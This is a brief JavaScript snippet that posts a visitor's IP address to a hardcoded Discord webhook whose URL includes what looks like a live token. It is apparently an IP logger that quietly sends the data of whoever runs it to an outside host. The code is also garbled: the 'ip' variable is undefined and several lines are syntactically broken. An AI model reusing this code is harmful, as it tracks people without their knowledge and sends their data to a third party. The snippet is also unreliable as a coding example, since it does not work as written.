const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB"

const msg = {
    "content": $ {
        "ip: ${ip}"
    }
}

fetch(whurl + "?wait=true", {
        "method": "POST",
        "headers": {
            "content-type": "application/json"
        },
        "body": JSON.stringify(msg)
    })
    .then(a = xa.json()).then(console.log)
